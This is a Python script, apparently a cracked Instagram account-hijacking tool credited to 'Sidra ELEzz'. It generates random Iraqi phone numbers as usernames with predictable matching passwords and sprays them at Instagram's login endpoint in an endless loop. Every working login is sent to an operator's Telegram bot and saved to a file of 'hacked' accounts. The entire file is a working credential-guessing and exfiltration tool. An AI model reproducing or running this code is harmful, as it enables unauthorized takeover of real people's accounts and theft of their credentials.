# Decrypt By Sidra ELEzz
# Github : https://github.com/SidraELEzz
# Telegram: https://t.me/TT_RQ
#It is not good for your personality that everything in you is great except for your mind
import requests, os, random, json, threading, secrets, uuid
from colorama import Fore, Style
from time import sleep
from datetime import datetime
from secrets import token_hex
from uuid import uuid4
from user_agent import generate_user_agent
E = '\x1b[1;31m'
G = '\x1b[1;32m'
S = '\x1b[1;33m'
w = 'https://pastebin.com/raw/D2sc9SRm'
rss = requests.get(w).text
if 'Sidra' in rss:
    print(G + '2021/6/27')
    print(G + 'وقت نتهاء الاشتراك')
    ID = input(S + 'ID BOT : ')
    token = input(G + 'TOKEN BOT : ')
    r = requests.Session()
    user = '1234567890'
    h = '+96477'
    ww = '077'
    while True:
        while True:
            us = str(''.join((random.choice(user) for i in range(8))))
            username = '+96477' + us
            password = '077' + us
            url = 'https://www.instagram.com/accounts/login/ajax/'
            headers = {'accept':'*/*',  'accept-encoding':'gzip,deflate,br', 
             'accept-language':'ar,ar-AE;q=0.9,en-US;q=0.8,en;q=0.7', 
             'content-length':'269', 
             'content-type':'application/x-www-form-urlencoded', 
             'cookie':'ig_did=32B4CB10-2A53-4801-B9BE-1733310CDB92-', 
             'origin':'https://www.instagram.com', 
             'referer':'https://www.instagram.com/', 
             'sec-fetch-dest':'empty', 
             'sec-fetch-mode':'cors', 
             'sec-fetch-site':'same-origin', 
             'user-agent':'Mozilla/5.0 (Linux; Android 10; Redmi Note 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36', 
             'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8', 
             'x-ig-app-id':'936619743392459', 
             'x-ig-www-claim':'0', 
             'x-instagram-ajax':'8a8118fa7d40', 
             'x-requested-with':'XMLHttpRequest'}
            data = {'username':username,  'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password), 
             'queryParams':'{}', 
             'optIntoOneTap':'false'}
            req_login = r.post(url, headers=headers, data=data, proxies=None)
            if 'userId' in req_login.text:
                tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=BY → @SidraTOOLS  ✓\n𝑬𝒎𝑨𝒊𝑳 : [ → {username} ← ]\npassword : [ → {password} ← ]\n- 𝐅𝐫𝐎𝐦 : @SidraTOOLS - @SidraTOOLS "
                i = requests.post(tlg)
                print(G + 'username ==> : ' + username + ': password ==> : ' + password)
                with open('تم الصيد بواسطة المهيب.txt', 'a') as HACKED:
                    HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))

        print(E + 'username ==> : ' + username + ': password ==> : ' + password)

else:
    print('نهتت الفترة المجانية راسل المطور لتفعيل ')
    print('معرف المطور +قناته')
    print('@SidraTOOLS \n@SidraTOOLS')
